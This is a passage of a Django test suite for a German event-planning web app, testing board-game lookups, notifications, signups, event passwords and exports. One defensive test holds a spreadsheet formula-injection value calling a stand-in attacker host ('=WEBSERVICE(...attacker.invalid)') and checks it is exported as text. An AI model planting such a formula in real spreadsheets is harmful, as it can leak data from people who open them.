            "name": "CATAN",
            "min_players": 3,
            "max_players": 4,
            "playtime_minutes": 120,
            "complexity": Decimal("2.32"),
            "rating": Decimal("7.12"),
            "description": "Trade, build & settle.",
            "categories": ["Civilization"],
            "mechanics": ["Dice Rolling"],
            "thumbnail_url": "https://cf.geekdo-images.com/thumb.jpg",
        }

        response = self.client.get("/spiele/bgg-daten/", {"id": "13"})

        self.assertEqual(response.status_code, 200)
        data = response.json()
        self.assertEqual(data["bgg_id"], 13)
        self.assertEqual(data["min_players"], 3)
        self.assertEqual(data["categories"], ["Civilization"])

    def test_lookup_rejects_non_numeric_ids(self):
        self.client.force_login(self.user)

        response = self.client.get("/spiele/bgg-daten/", {"id": "abc"})

        self.assertEqual(response.status_code, 400)
        self.assertIn("error", response.json())


class GameEntryFormBggSyncTests(TestCase):
    BGG_DATA = {
        "name": "CATAN",
        "min_players": 3,
        "max_players": 4,
        "playtime_minutes": 120,
        "min_age": 10,
        "year": 1995,
        "complexity": Decimal("2.32"),
        "rating": Decimal("7.12"),
        "description": "Trade, build & settle.",
        "categories": ["Civilization"],
        "mechanics": ["Dice Rolling"],
        "thumbnail_url": "https://cf.geekdo-images.com/thumb.jpg",
    }

    def setUp(self):
        self.user = User.objects.create(username="form-user", email="form@example.com")
        self.event = Event.objects.create(title="Spielenacht", created_by=self.user)

    @override_settings(BGG_API_TOKEN="test-token")
    @patch("events.forms.bgg.fetch_bgg_game")
    def test_save_fills_fields_from_bgg_when_bgg_id_set(self, mock_fetch):
        mock_fetch.return_value = dict(self.BGG_DATA)

        form = GameEntryForm(
            {"name": "Catan", "type": "bring", "description": "", "bgg_id": 13, "bgg_categories_text": ""},
            event=self.event,
        )
        self.assertTrue(form.is_valid(), form.errors)

        game = form.save(commit=False)
        game.event = self.event
        game.save()

        mock_fetch.assert_called_once_with(13)
        self.assertEqual(game.min_players, 3)
        self.assertEqual(game.max_players, 4)
        self.assertEqual(game.playtime_minutes, 120)
        self.assertEqual(game.min_age, 10)
        self.assertEqual(game.bgg_year, 1995)
        self.assertEqual(game.complexity, Decimal("2.32"))
        self.assertEqual(game.bgg_rating, Decimal("7.12"))
        self.assertEqual(game.bgg_categories, ["Civilization"])
        self.assertEqual(game.bgg_mechanics, ["Dice Rolling"])
        self.assertIsNotNone(game.bgg_synced_at)
        self.assertEqual(form.bgg_sync_error, "")

    @override_settings(BGG_API_TOKEN="")
    def test_save_without_token_still_saves_and_reports_error(self):
        form = GameEntryForm(
            {"name": "Catan", "type": "bring", "description": "", "bgg_id": 13, "bgg_categories_text": ""},
            event=self.event,
        )
        self.assertTrue(form.is_valid(), form.errors)

        game = form.save(commit=False)
        game.event = self.event
        game.save()

        self.assertEqual(game.name, "Catan")
        self.assertIsNone(game.min_players)
        self.assertTrue(form.bgg_sync_error)

    @override_settings(BGG_API_TOKEN="test-token")
    @patch("events.forms.bgg.fetch_bgg_game")
    def test_save_skips_bgg_when_already_synced_and_complete(self, mock_fetch):
        game = GameEntry.objects.create(
            event=self.event,
            name="Catan",
            created_by=self.user,
            bgg_id=13,
            min_players=3,
            max_players=4,
            complexity=Decimal("2.32"),
            bgg_rating=Decimal("7.12"),
            bgg_categories=["Civilization"],
            bgg_synced_at=timezone.now(),
        )
        form = GameEntryForm(
            {
                "name": "Catan",
                "type": "bring",
                "description": "",
                "bgg_id": 13,
                "min_players": 3,
                "max_players": 4,
                "complexity": "2.32",
                "bgg_rating": "7.12",
                "bgg_categories_text": "Civilization",
            },
            instance=game,
            event=self.event,
        )
        self.assertTrue(form.is_valid(), form.errors)

        form.save()

        mock_fetch.assert_not_called()

    @override_settings(BGG_API_TOKEN="test-token")
    @patch("events.forms.bgg.fetch_bgg_game")
    def test_game_create_shows_warning_when_bgg_unavailable(self, mock_fetch):
        mock_fetch.side_effect = bgg.BggLookupError("BGG war nicht erreichbar")
        client = Client(SERVER_NAME="localhost")
        client.force_login(self.user)

        response = client.post(
            f"/{self.event.pk}/spiele/neu/",
            {"name": "Catan", "type": "bring", "description": "", "bgg_id": 13, "bgg_categories_text": ""},
        )

        game = GameEntry.objects.get(event=self.event, name="Catan")
        self.assertRedirects(response, f"/{self.event.pk}/#game-{game.pk}", fetch_redirect_response=False)
        self.assertEqual(game.bgg_id, 13)
        detail = client.get(f"/{self.event.pk}/")
        self.assertContains(detail, "BGG-Daten konnten beim Speichern nicht geladen werden")


class GameBulkCreateTests(TestCase):
    def setUp(self):
        self.user = User.objects.create(username="alice", email="alice@example.com")
        self.event = Event.objects.create(title="Testevent", created_by=self.user)
        self.client = Client(SERVER_NAME="localhost")
        self.client.force_login(self.user)
        self.url = f"/{self.event.pk}/spiele/mehrere/"

    def test_form_is_linked_from_games_list(self):
        response = self.client.get(f"/{self.event.pk}/")
        self.assertContains(response, self.url)
        self.assertContains(self.client.get(self.url), 'name="name"', count=GameBulkForm.INITIAL_ROWS)

    def test_creates_all_filled_rows_with_bring_claims(self):
        response = self.client.post(self.url, {
            "type": "bring",
            "name": ["Catan", "", "  Azul  ", "catan"],
            "bgg_id": ["", "", "", ""],
        })

        self.assertRedirects(response, f"/{self.event.pk}/#games-section", fetch_redirect_response=False)
        games = GameEntry.objects.filter(event=self.event).order_by("name")
        self.assertEqual([game.name for game in games], ["Azul", "Catan"])
        self.assertEqual(GameBringClaim.objects.filter(user=self.user, game__event=self.event).count(), 2)

    def test_checked_rows_get_explain_claim(self):
        self.client.post(self.url, {
            "type": "bring",
            "name": ["Catan", "Azul", "Heat"],
            "bgg_id": ["", "", ""],
            "explain": ["0", "2"],
        })

        explained = GameExplainClaim.objects.filter(user=self.user, game__event=self.event)
        self.assertEqual(sorted(claim.game.name for claim in explained), ["Catan", "Heat"])

    def test_existing_game_gets_explain_claim_when_checked(self):
        other = User.objects.create(username="bob", email="bob@example.com")
        game = GameEntry.objects.create(event=self.event, name="Catan", type="wish", created_by=other)

        self.client.post(self.url, {"type": "wish", "name": ["Catan"], "bgg_id": [""], "explain": ["0"]})

        self.assertTrue(GameExplainClaim.objects.filter(game=game, user=self.user).exists())
        self.assertFalse(GameBringClaim.objects.filter(game=game, user=self.user).exists())

    def test_wishes_get_no_bring_claim(self):
        self.client.post(self.url, {"type": "wish", "name": ["Azul"], "bgg_id": [""]})

        game = GameEntry.objects.get(event=self.event, name="Azul")
        self.assertEqual(game.type, "wish")
        self.assertFalse(game.bring_claims.exists())

    def test_existing_game_gets_bring_claim_instead_of_duplicate(self):
        other = User.objects.create(username="bob", email="bob@example.com")
        game = GameEntry.objects.create(event=self.event, name="Catan", type="bring", created_by=other)

        self.client.post(self.url, {"type": "bring", "name": ["CATAN", "Azul"], "bgg_id": ["", ""]})

        self.assertEqual(GameEntry.objects.filter(event=self.event).count(), 2)
        self.assertTrue(GameBringClaim.objects.filter(game=game, user=self.user).exists())

    def test_invalid_rows_keep_input_and_save_nothing(self):
        response = self.client.post(self.url, {"type": "bring", "name": ["Catan", "Azul"], "bgg_id": ["", "abc"]})

        self.assertEqual(response.status_code, 200)
        self.assertContains(response, "keine gültige Zahl")
        self.assertContains(response, 'value="Catan"')
        self.assertFalse(GameEntry.objects.filter(event=self.event).exists())

    def test_empty_submission_is_rejected(self):
        response = self.client.post(self.url, {"type": "bring", "name": ["", ""], "bgg_id": ["", ""]})

        self.assertContains(response, "mindestens einen Spieltitel")

    @override_settings(BGG_API_TOKEN="test-token")
    @patch("events.views.bgg.fetch_bgg_games")
    def test_bgg_data_is_fetched_in_one_request(self, mock_fetch):
        def fake(ids):
            return {
                bgg_id: {
                    "name": f"Spiel {bgg_id}", "min_players": 2, "max_players": 4, "playtime_minutes": 60,
                    "min_age": 10, "year": 2000, "complexity": Decimal("2.00"), "rating": Decimal("7.00"),
                    "description": "", "categories": ["Strategiespiel"], "mechanics": [], "thumbnail_url": "",
                }
                for bgg_id in ids
            }
        mock_fetch.side_effect = fake

        self.client.post(self.url, {"type": "bring", "name": ["Catan", "Azul", "Ohne BGG"], "bgg_id": ["13", "230802", ""]})

        mock_fetch.assert_called_once_with([13, 230802])
        catan = GameEntry.objects.get(event=self.event, name="Catan")
        self.assertEqual(catan.max_players, 4)
        self.assertIsNotNone(catan.bgg_synced_at)
        self.assertIsNone(GameEntry.objects.get(event=self.event, name="Ohne BGG").bgg_synced_at)

    @override_settings(BGG_API_TOKEN="test-token")
    @patch("events.views.bgg.fetch_bgg_games")
    def test_bgg_failure_still_saves_games(self, mock_fetch):
        mock_fetch.side_effect = bgg.BggLookupError("BGG war nicht erreichbar")

        response = self.client.post(self.url, {"type": "bring", "name": ["Catan"], "bgg_id": ["13"]}, follow=True)

        game = GameEntry.objects.get(event=self.event, name="Catan")
        self.assertEqual(game.bgg_id, 13)
        self.assertIsNone(game.bgg_synced_at)
        self.assertContains(response, "automatisch nachgeholt")


class GameEntrySummaryInfoTests(TestCase):
    def test_players_and_complexity_labels(self):
        self.assertEqual(GameEntry(min_players=3, max_players=4).players_label, "3–4")
        self.assertEqual(GameEntry(min_players=3, max_players=3).players_label, "ab 3")
        self.assertEqual(GameEntry(min_players=2).players_label, "ab 2")
        self.assertEqual(GameEntry(max_players=6).players_label, "bis 6")
        self.assertEqual(GameEntry().players_label, "")
        self.assertEqual(GameEntry(complexity=Decimal("1.80")).complexity_label, "einfach")
        self.assertEqual(GameEntry(complexity=Decimal("2.32")).complexity_label, "mittel")
        self.assertEqual(GameEntry(complexity=Decimal("3.90")).complexity_label, "komplex")
        self.assertEqual(GameEntry().complexity_label, "")

    def test_event_detail_shows_summary_and_popup_info(self):
        user = User.objects.create(username="host", email="host@example.com")
        event = Event.objects.create(title="Spielenacht", created_by=user)
        GameEntry.objects.create(
            event=event,
            name="Catan",
            created_by=user,
            bgg_id=13,
            min_players=3,
            max_players=4,
            min_age=10,
            bgg_year=1995,
            playtime_minutes=120,
            complexity=Decimal("2.32"),
            bgg_rating=Decimal("7.12"),
            bgg_categories=["Civilization"],
            bgg_mechanics=["Dice Rolling"],
            bgg_description="Trade, build & settle. " + "Detail" * 200,
            thumbnail_url="https://cf.geekdo-images.com/thumb.jpg",
        )
        client = Client(SERVER_NAME="localhost")
        client.force_login(user)

        response = client.get(f"/{event.pk}/")

        self.assertContains(response, "game-summary-thumb")
        self.assertContains(response, "3–4")
        self.assertContains(response, "mittel")
        self.assertContains(response, "7,12")
        self.assertContains(response, "Erschienen")
        self.assertContains(response, "1995")
        self.assertContains(response, "ab 10 Jahren")
        self.assertContains(response, "Kurzbeschreibung")


def _age_all_notifications(hours):
    IdeaCommentNotification.objects.update(created_at=timezone.now() - datetime.timedelta(hours=hours))


class IdeaCommentNotificationQueueTests(TestCase):
    def setUp(self):
        self.author = User.objects.create(username="author", email="author@example.com")
        self.commenter = User.objects.create(username="commenter", email="commenter@example.com")
        self.other_commenter = User.objects.create(username="other", email="other@example.com")
        self.event = Event.objects.create(title="Testevent", created_by=self.author)
        self.idea = Idea.objects.create(event=self.event, text="Grillabend", author=self.author)

    def test_idea_author_gets_queued_as_recipient(self):
        comment = IdeaComment.objects.create(idea=self.idea, author=self.commenter, text="Gute Idee!")
        queue_idea_comment_notifications(comment)
        recipients = set(
            IdeaCommentNotification.objects.filter(comment=comment).values_list("recipient_id", flat=True)
        )
        self.assertEqual(recipients, {self.author.pk})

    def test_commenter_does_not_get_notified_of_own_comment(self):
        comment = IdeaComment.objects.create(idea=self.idea, author=self.author, text="Kommentar zur eigenen Idee")
        queue_idea_comment_notifications(comment)
        self.assertFalse(IdeaCommentNotification.objects.filter(comment=comment, recipient=self.author).exists())

    def test_prior_commenters_get_notified_but_not_the_new_commenter(self):
        first = IdeaComment.objects.create(idea=self.idea, author=self.commenter, text="Erster Kommentar")
        queue_idea_comment_notifications(first)

        second = IdeaComment.objects.create(idea=self.idea, author=self.other_commenter, text="Zweiter Kommentar")
        queue_idea_comment_notifications(second)

        recipients = set(
            IdeaCommentNotification.objects.filter(comment=second).values_list("recipient_id", flat=True)
        )
        self.assertEqual(recipients, {self.author.pk, self.commenter.pk})

    def test_queueing_twice_does_not_duplicate(self):
        comment = IdeaComment.objects.create(idea=self.idea, author=self.commenter, text="Gute Idee!")
        queue_idea_comment_notifications(comment)
        queue_idea_comment_notifications(comment)
        self.assertEqual(IdeaCommentNotification.objects.filter(comment=comment).count(), 1)


class IdeaCommentNotificationSendingTests(TestCase):
    def setUp(self):
        self.author = User.objects.create(username="author", email="author@example.com")
        self.commenter = User.objects.create(username="commenter", email="commenter@example.com")
        self.event = Event.objects.create(title="Testevent", created_by=self.author)
        self.idea = Idea.objects.create(event=self.event, text="Grillabend", author=self.author)

    def test_notification_not_sent_before_one_hour(self):
        comment = IdeaComment.objects.create(idea=self.idea, author=self.commenter, text="Kommentar")
        queue_idea_comment_notifications(comment)

        sent_count = send_pending_idea_comment_notifications()

        self.assertEqual(sent_count, 0)
        self.assertEqual(len(mail.outbox), 0)
        self.assertTrue(IdeaCommentNotification.objects.filter(comment=comment, sent_at__isnull=True).exists())

    def test_notification_sent_after_one_hour_and_marked_sent(self):
        comment = IdeaComment.objects.create(idea=self.idea, author=self.commenter, text="Kommentar")
        queue_idea_comment_notifications(comment)
        _age_all_notifications(hours=2)

        sent_count = send_pending_idea_comment_notifications()

        self.assertEqual(sent_count, 1)
        self.assertEqual(len(mail.outbox), 1)
        self.assertEqual(mail.outbox[0].to, [self.author.email])
        self.assertTrue(IdeaCommentNotification.objects.get(comment=comment).sent_at is not None)

    def test_multiple_comments_within_the_hour_are_batched_into_one_email(self):
        first = IdeaComment.objects.create(idea=self.idea, author=self.commenter, text="Erster Kommentar")
        queue_idea_comment_notifications(first)
        _age_all_notifications(hours=2)

        second = IdeaComment.objects.create(idea=self.idea, author=self.commenter, text="Zweiter Kommentar")
        queue_idea_comment_notifications(second)

        sent_count = send_pending_idea_comment_notifications()

        self.assertEqual(sent_count, 1)
        self.assertEqual(len(mail.outbox), 1)
        self.assertIn("Erster Kommentar", mail.outbox[0].body)
        self.assertIn("Zweiter Kommentar", mail.outbox[0].body)

    def test_send_failure_for_one_recipient_does_not_block_others(self):
        other_author = User.objects.create(username="other_author", email="other_author@example.com")
        other_idea = Idea.objects.create(event=self.event, text="Andere Idee", author=other_author)

        comment1 = IdeaComment.objects.create(idea=self.idea, author=self.commenter, text="Kommentar 1")
        queue_idea_comment_notifications(comment1)
        comment2 = IdeaComment.objects.create(idea=other_idea, author=self.commenter, text="Kommentar 2")
        queue_idea_comment_notifications(comment2)
        _age_all_notifications(hours=2)

        real_send_mail = mail.send_mail

        def flaky_send_mail(subject, message, from_email, recipient_list, **kwargs):
            if recipient_list == [self.author.email]:
                raise RuntimeError("SMTP kaputt")
            return real_send_mail(subject, message, from_email, recipient_list, **kwargs)

        with patch("events.notifications.send_mail", side_effect=flaky_send_mail):
            sent_count = send_pending_idea_comment_notifications()

        self.assertEqual(sent_count, 1)
        self.assertEqual(len(mail.outbox), 1)
        self.assertEqual(mail.outbox[0].to, [other_author.email])
        self.assertTrue(
            IdeaCommentNotification.objects.filter(comment=comment1, sent_at__isnull=True).exists(),
            "Fehlgeschlagene Benachrichtigung sollte für einen späteren Versuch offen bleiben.",
        )
        self.assertTrue(IdeaCommentNotification.objects.get(comment=comment2).sent_at is not None)


class DutyCapacityTests(TestCase):
    def setUp(self):
        self.alice = User.objects.create(username="alice", email="alice@example.com")
        self.bob = User.objects.create(username="bob", email="bob@example.com")
        self.event = Event.objects.create(title="Testevent", created_by=self.alice)
        self.duty = Duty.objects.create(
            event=self.event, title="Aufbau", needed_people=1, created_by=self.alice
        )

    def test_duty_without_target_is_never_full(self):
        duty = Duty.objects.create(event=self.event, title="Abbau", created_by=self.alice)
        self.assertFalse(duty.is_full)
        self.assertIsNone(duty.spots_left)

    def test_duty_is_full_after_max_signups(self):
        DutySignup.objects.create(duty=self.duty, user=self.alice)
        self.assertTrue(self.duty.is_full)
        self.assertEqual(self.duty.spots_left, 0)

    def test_view_rejects_signup_when_full(self):
        DutySignup.objects.create(duty=self.duty, user=self.alice)
        client = Client(SERVER_NAME="localhost")
        client.force_login(self.bob)
        client.post(f"/dienste/{self.duty.id}/eintragen/")
        self.assertEqual(self.duty.signups.count(), 1)
        self.assertFalse(self.duty.signups.filter(user=self.bob).exists())

    def test_view_allows_signup_when_free(self):
        client = Client(SERVER_NAME="localhost")
        client.force_login(self.bob)
        client.post(f"/dienste/{self.duty.id}/eintragen/")
        self.assertTrue(self.duty.signups.filter(user=self.bob).exists())

    def test_event_detail_shows_who_created_the_duty(self):
        self.alice.first_name = "Alice"
        self.alice.last_name = "Beispiel"
        self.alice.save()
        client = Client(SERVER_NAME="localhost")
        client.force_login(self.alice)

        response = client.get(f"/{self.event.pk}/")

        self.assertContains(response, "(angelegt von Alice Beispiel)")


class SlotWaitlistTests(TestCase):
    def setUp(self):
        self.alice = User.objects.create(username="alice", email="alice@example.com")
        self.bob = User.objects.create(username="bob", email="bob@example.com")
        self.event = Event.objects.create(title="Testevent", created_by=self.alice)
        self.day = EventDay.objects.create(event=self.event, date=datetime.date(2026, 9, 5))
        self.slot = Slot.objects.create(
            event=self.event,
            day=self.day,
            title="Kochworkshop",
            start_time=datetime.time(17, 0),
            end_time=datetime.time(18, 0),
            max_participants=1,
            allow_waitlist=True,
            created_by=self.alice,
        )

    def test_signup_beyond_capacity_goes_to_waitlist(self):
        SlotSignup.objects.create(slot=self.slot, user=self.alice)
        client = Client(SERVER_NAME="localhost")
        client.force_login(self.bob)
        client.post(f"/slots/{self.slot.id}/anmelden/")
        self.assertTrue(self.slot.signups.filter(user=self.bob).exists())
        self.assertEqual(self.slot.waitlist_count, 1)


class AttendanceCancelCleanupTests(TestCase):
    def setUp(self):
        self.alice = User.objects.create(username="alice", email="alice@example.com")
        self.event = Event.objects.create(title="Testevent", created_by=self.alice)
        self.day = EventDay.objects.create(event=self.event, date=datetime.date(2026, 9, 5))
        self.attendance = Attendance.objects.create(event=self.event, user=self.alice)
        self.attendance.days.add(self.day)

        item = PotluckItem.objects.create(event=self.event, title="Kuchen")
        PotluckClaim.objects.create(item=item, user=self.alice)

        game = GameEntry.objects.create(event=self.event, name="Catan", type="bring", created_by=self.alice)
        GameBringClaim.objects.create(game=game, user=self.alice)

        slot = Slot.objects.create(
            event=self.event,
            day=self.day,
            title="Workshop",
            start_time=datetime.time(10, 0),
            end_time=datetime.time(11, 0),
            max_participants=5,
            created_by=self.alice,
        )
        SlotSignup.objects.create(slot=slot, user=self.alice)

        duty = Duty.objects.create(event=self.event, title="Aufbau", created_by=self.alice)
        DutySignup.objects.create(duty=duty, user=self.alice)

    def test_cancelling_attendance_removes_dependent_commitments(self):
        client = Client(SERVER_NAME="localhost")
        client.force_login(self.alice)
        client.post(f"/anwesenheit/{self.attendance.pk}/absagen/")

        self.assertFalse(Attendance.objects.filter(pk=self.attendance.pk).exists())
        self.assertFalse(PotluckClaim.objects.filter(user=self.alice).exists())
        self.assertFalse(GameBringClaim.objects.filter(user=self.alice).exists())
        self.assertFalse(SlotSignup.objects.filter(user=self.alice).exists())
        self.assertFalse(DutySignup.objects.filter(user=self.alice).exists())


class DeclineWithAttendanceCleanupTests(TestCase):
    def setUp(self):
        self.user = User.objects.create(username="alice", email="alice@example.com")
        self.event = Event.objects.create(title="Testevent", created_by=self.user)
        self.day = EventDay.objects.create(event=self.event, date=datetime.date(2026, 9, 5))
        self.attendance = Attendance.objects.create(event=self.event, user=self.user)
        self.attendance.days.add(self.day)
        item = PotluckItem.objects.create(event=self.event, title="Kuchen")
        PotluckClaim.objects.create(item=item, user=self.user)

    def test_declining_with_delete_attendance_removes_commitments(self):
        client = Client(SERVER_NAME="localhost")
        client.force_login(self.user)
        client.post(f"/{self.event.pk}/absage/", {"comment": "", "delete_attendance": "1"})
        self.assertFalse(Attendance.objects.filter(pk=self.attendance.pk).exists())
        self.assertFalse(PotluckClaim.objects.filter(user=self.user).exists())
        self.assertTrue(Decline.objects.filter(event=self.event, user=self.user).exists())


class EventAccessPasswordTests(TestCase):
    def setUp(self):
        cache.clear()
        self.owner = User.objects.create(username="owner", email="owner@example.com")
        self.visitor = User.objects.create(username="visitor", email="visitor@example.com")
        self.event = Event.objects.create(title="Geheimparty", created_by=self.owner)
        self.event.set_access_password("swordfish")
        self.event.save(update_fields=["access_password_hash"])

    def test_open_event_needs_no_password(self):
        open_event = Event.objects.create(title="Offen", created_by=self.owner)
        idea = Idea.objects.create(event=open_event, text="Teilbare Idee", author=self.owner)
        client = Client(SERVER_NAME="localhost")
        client.force_login(self.visitor)
        response = client.get(f"/{open_event.pk}/")
        self.assertContains(response, "Offen")
        self.assertContains(response, f'href="/ideen/{idea.pk}/"')
        self.assertContains(response, "Link teilen")

        response = client.get(f"/ideen/{idea.pk}/")
        self.assertRedirects(
            response,
            f"/{open_event.pk}/#idea-{idea.pk}",
            fetch_redirect_response=False,
        )

    def test_locked_event_shows_password_prompt(self):
        client = Client(SERVER_NAME="localhost")
        client.force_login(self.visitor)
        response = client.get(f"/{self.event.pk}/")
        self.assertTemplateUsed(response, "events/event_password.html")

    def test_wrong_password_is_rejected(self):
        client = Client(SERVER_NAME="localhost")
        client.force_login(self.visitor)
        response = client.post(f"/{self.event.pk}/", {"access_password": "falsch"})
        self.assertTemplateUsed(response, "events/event_password.html")

    def test_correct_password_grants_persistent_access(self):
        client = Client(SERVER_NAME="localhost")
        client.force_login(self.visitor)
        client.post(f"/{self.event.pk}/", {"access_password": "swordfish"})
        response = client.get(f"/{self.event.pk}/")
        self.assertContains(response, "Geheimparty")

    def test_direct_event_subpage_is_blocked_without_password(self):
        client = Client(SERVER_NAME="localhost")
        client.force_login(self.visitor)

        response = client.get(f"/{self.event.pk}/ideen/neu/")

        self.assertEqual(response.status_code, 403)

    def test_direct_write_is_blocked_without_password(self):
        client = Client(SERVER_NAME="localhost")
        client.force_login(self.visitor)

        response = client.post(f"/{self.event.pk}/ideen/neu/", {"text": "Umgehung"})

        self.assertEqual(response.status_code, 403)
        self.assertFalse(Idea.objects.filter(event=self.event, text="Umgehung").exists())

    def test_related_object_write_is_blocked_without_password(self):
        idea = Idea.objects.create(event=self.event, text="Geschuetzt", author=self.owner)
        client = Client(SERVER_NAME="localhost")
        client.force_login(self.visitor)

        response = client.post(f"/ideen/{idea.pk}/like/")

        self.assertEqual(response.status_code, 403)
        self.assertFalse(IdeaLike.objects.filter(idea=idea, user=self.visitor).exists())

    def test_idea_permalink_preserves_destination_through_password_prompt(self):
        idea = Idea.objects.create(event=self.event, text="Geschuetzte Idee", author=self.owner)
        client = Client(SERVER_NAME="localhost")
        client.force_login(self.visitor)

        response = client.get(f"/ideen/{idea.pk}/")
        self.assertTemplateUsed(response, "events/event_password.html")

        response = client.post(f"/ideen/{idea.pk}/", {"access_password": "swordfish"})
        self.assertRedirects(response, f"/ideen/{idea.pk}/", fetch_redirect_response=False)

        response = client.get(f"/ideen/{idea.pk}/")
        self.assertRedirects(
            response,
            f"/{self.event.pk}/#idea-{idea.pk}",
            fetch_redirect_response=False,
        )

    def test_direct_write_succeeds_after_unlock(self):
        client = Client(SERVER_NAME="localhost")
        client.force_login(self.visitor)
        client.post(f"/{self.event.pk}/", {"access_password": "swordfish"})

        response = client.post(f"/{self.event.pk}/ideen/neu/", {"text": "Freigeschaltet"})

        self.assertEqual(response.status_code, 302)
        self.assertTrue(Idea.objects.filter(event=self.event, text="Freigeschaltet").exists())

    def test_password_change_revokes_existing_access(self):
        client = Client(SERVER_NAME="localhost")
        client.force_login(self.visitor)
        client.post(f"/{self.event.pk}/", {"access_password": "swordfish"})
        self.event.set_access_password("new-password")
        self.event.save(update_fields=["access_password_hash"])

        response = client.get(f"/{self.event.pk}/")

        self.assertTemplateUsed(response, "events/event_password.html")

    def test_failed_password_attempts_are_rate_limited(self):
        client = Client(SERVER_NAME="localhost", REMOTE_ADDR="192.0.2.10")
        client.force_login(self.visitor)

        for _ in range(4):
            response = client.post(f"/{self.event.pk}/", {"access_password": "wrong"})
            self.assertEqual(response.status_code, 200)
        response = client.post(f"/{self.event.pk}/", {"access_password": "wrong"})

        self.assertEqual(response.status_code, 429)
        self.assertContains(response, "Zu viele Fehlversuche", status_code=429)


class AttendanceExportSecurityTests(TestCase):
    def setUp(self):
        self.owner = User.objects.create(username="owner", email="owner@example.com")
        self.event = Event.objects.create(title="Testevent", created_by=self.owner)
        self.day = EventDay.objects.create(event=self.event, date=datetime.date(2026, 9, 5))

    def test_user_controlled_cells_are_exported_as_text(self):
        attendance = Attendance.objects.create(
            event=self.event,
            user=self.owner,
            name='=WEBSERVICE("https://attacker.invalid")',
            invited_by="+malicious",
            comment="=malicious-comment",
        )
        attendance.days.add(self.day)
        client = Client(SERVER_NAME="localhost")
        client.force_login(self.owner)

        response = client.get(f"/tage/{self.day.pk}/teilnehmer.xlsx/")
        workbook = openpyxl.load_workbook(BytesIO(response.content), data_only=False)
        exported_name, _, exported_inviter, exported_comment = workbook.active[2]

        self.assertEqual(exported_name.data_type, "s")
        self.assertEqual(exported_name.value, "'=WEBSERVICE(\"https://attacker.invalid\")")
        self.assertEqual(exported_inviter.data_type, "s")
        self.assertEqual(exported_inviter.value, "'+malicious")
        self.assertEqual(exported_comment.data_type, "s")
        self.assertEqual(exported_comment.value, "'=malicious-comment")

    def test_export_includes_comment_for_attendance_and_brought_people(self):
        attendance = Attendance.objects.create(
            event=self.event,
            user=self.owner,
            name="Testmitglied",
            comment="Hinweis zur gesamten Anmeldung",
        )
        attendance.days.add(self.day)
        brought_person = attendance.brought_people.create(name="Testgast", role="guest")
        brought_person.days.add(self.day)
        client = Client(SERVER_NAME="localhost")
        client.force_login(self.owner)

        response = client.get(f"/tage/{self.day.pk}/teilnehmer.xlsx/")
        workbook = openpyxl.load_workbook(BytesIO(response.content), data_only=False)
        rows = list(workbook.active.values)

        self.assertEqual(rows[0][3], "Kommentar zur Anmeldung")
        self.assertEqual(rows[1][3], "Hinweis zur gesamten Anmeldung")
        self.assertEqual(rows[2][3], "Hinweis zur gesamten Anmeldung")


class PotluckItemPermissionTests(TestCase):
    def setUp(self):
        self.orga = User.objects.create(username="orga", email="orga@example.com")
        self.owner = User.objects.create(username="owner", email="owner@example.com")
        self.other = User.objects.create(username="other", email="other@example.com")
        self.event = Event.objects.create(title="Testevent", created_by=self.orga)
        self.item = PotluckItem.objects.create(
            event=self.event,
            title="Salat",
            needed_quantity=2,
            comment="Mit Dressing",
            created_by=self.owner,
        )

    def _edit_data(self, title="Kartoffelsalat"):
        return {
            "title": title,
            "needed_quantity": 3,
            "unit": "Schüsseln",
            "comment": "Ohne Zwiebeln",
        }

    def test_owner_can_edit_without_orga_log(self):
        client = Client(SERVER_NAME="localhost")
        client.force_login(self.owner)

        response = client.post(f"/mitbringliste/{self.item.pk}/bearbeiten/", self._edit_data())

        self.assertEqual(response.status_code, 302)
        self.item.refresh_from_db()
        self.assertEqual(self.item.title, "Kartoffelsalat")
        self.assertEqual(self.item.unit, "Schüsseln")
        self.assertFalse(OrgaActionLog.objects.exists())

    def test_owner_cannot_edit_or_delete_once_claimed(self):
        PotluckClaim.objects.create(item=self.item, user=self.other, quantity=1)
        client = Client(SERVER_NAME="localhost")
        client.force_login(self.owner)

        edit_response = client.post(f"/mitbringliste/{self.item.pk}/bearbeiten/", self._edit_data())
        delete_response = client.post(f"/mitbringliste/{self.item.pk}/loeschen/")

        self.assertEqual(edit_response.status_code, 403)
        self.assertEqual(delete_response.status_code, 403)
        self.item.refresh_from_db()
        self.assertEqual(self.item.title, "Salat")
        self.assertTrue(PotluckItem.objects.filter(pk=self.item.pk).exists())

    def test_orga_can_still_edit_and_delete_claimed_item(self):
        PotluckClaim.objects.create(item=self.item, user=self.other, quantity=1)
        client = Client(SERVER_NAME="localhost")
        client.force_login(self.orga)

        response = client.post(f"/mitbringliste/{self.item.pk}/bearbeiten/", self._edit_data())

        self.assertEqual(response.status_code, 302)
        self.item.refresh_from_db()
        self.assertEqual(self.item.title, "Kartoffelsalat")

    def test_unrelated_user_cannot_edit_or_delete(self):
        client = Client(SERVER_NAME="localhost")
        client.force_login(self.other)

        edit_response = client.post(
            f"/mitbringliste/{self.item.pk}/bearbeiten/", self._edit_data()
        )
        delete_response = client.post(f"/mitbringliste/{self.item.pk}/loeschen/")

        self.assertEqual(edit_response.status_code, 403)
        self.assertEqual(delete_response.status_code, 403)
        self.item.refresh_from_db()
        self.assertEqual(self.item.title, "Salat")

    def test_orga_can_edit_others_item_and_action_is_logged(self):
        client = Client(SERVER_NAME="localhost")
        client.force_login(self.orga)

        response = client.post(f"/mitbringliste/{self.item.pk}/bearbeiten/", self._edit_data())

        self.assertEqual(response.status_code, 302)
        log = OrgaActionLog.objects.get()
        self.assertEqual(log.actor, self.orga)
        self.assertIn("Salat", log.description)
        self.assertIn("owner", log.description)
        self.assertIn("bearbeitet", log.description)

    def test_orga_can_delete_others_item_and_action_is_logged(self):
        client = Client(SERVER_NAME="localhost")
        client.force_login(self.orga)

        response = client.post(f"/mitbringliste/{self.item.pk}/loeschen/")

        self.assertEqual(response.status_code, 302)
        self.assertFalse(PotluckItem.objects.filter(pk=self.item.pk).exists())
        log = OrgaActionLog.objects.get()
        self.assertEqual(log.actor, self.orga)
        self.assertIn("Salat", log.description)
        self.assertIn("owner", log.description)
        self.assertIn("gelöscht", log.description)

    @override_settings(
        STORAGES={
            "default": {"BACKEND": "django.core.files.storage.FileSystemStorage"},
            "staticfiles": {"BACKEND": "django.contrib.staticfiles.storage.StaticFilesStorage"},
        }
    )
    def test_actions_are_below_title_and_only_visible_to_owner_or_orga(self):
        owner_client = Client(SERVER_NAME="localhost")
        owner_client.force_login(self.owner)
        owner_html = owner_client.get(f"/{self.event.pk}/").content.decode()
